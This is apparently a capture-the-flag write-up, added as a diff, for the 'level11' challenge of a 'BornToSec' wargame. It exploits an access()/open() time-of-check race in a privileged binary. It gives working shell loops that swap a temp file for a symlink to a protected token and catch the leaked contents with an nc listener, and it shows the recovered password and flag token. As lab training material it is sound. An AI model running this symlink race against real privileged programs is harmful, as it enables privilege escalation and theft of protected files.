@@ -1,0 +1,79 @@
+# We can understand by reading the README
+# that maybe it is a question of race condition
+# beside in level.s he use access
+```
+.L2:
+	...
+	call	access
+	...
+```
+# a C function that try to acces the file and return true or false if
+# the user have access to it
+# so if we can change the file between the access and the open
+# we may have a chance to force the programm to open the one we want
+# for that we have 3 shell scripts
+
+# the first one remove and create a tmp file
+# remove it and create a sym link to the real file
+# infinit loop
+```
+level11@BornToSec:/tmp/tommy$ cat sh.sh
+#!/bin/sh
+
+while [ 1 ]
+do
+	rm -rf /tmp/tommy/token
+	touch /tmp/tommy/token 2>/dev/null
+	rm -rf /tmp/tommy/token
+	ln -s ~/token /tmp/tommy/token
+done
+```
+
+# the second that listen and print in infinit on port 6969
+```
+level11@BornToSec:/tmp/tommy$ cat nc.sh
+#!/bin/sh
+
+while [ 1 ]
+do
+	nc=$(nc -l 6969)
+	echo "$nc"
+done
+```
+
+# the third that execute the binary with the parameters also infinit
+```
+level11@BornToSec:/tmp/tommy$ cat level.sh
+#!/bin/sh
+
+while [ 1 ]
+do
+	~/level11 /tmp/tommy/token 0 2>/dev/null
+done
+```
+
+
+# after that you just need to run them
+# best order will be : sh.sh , nc.sh then level.sh
+# and wait in nc.sh console to see if something happen
+```
+level11@BornToSec:/tmp/tommy$ ./nc.sh
+.*( )*.
+.*( )*.
+.*( )*.
+...
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+...
+.*( )*.
+.*( )*.
+.*( )*.
+```
+# here you go
+```
+level11@BornToSec:~$ su flag11
+Password:
+Don't forget to launch getflag !
+flag11@BornToSec:~$ getflag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+```
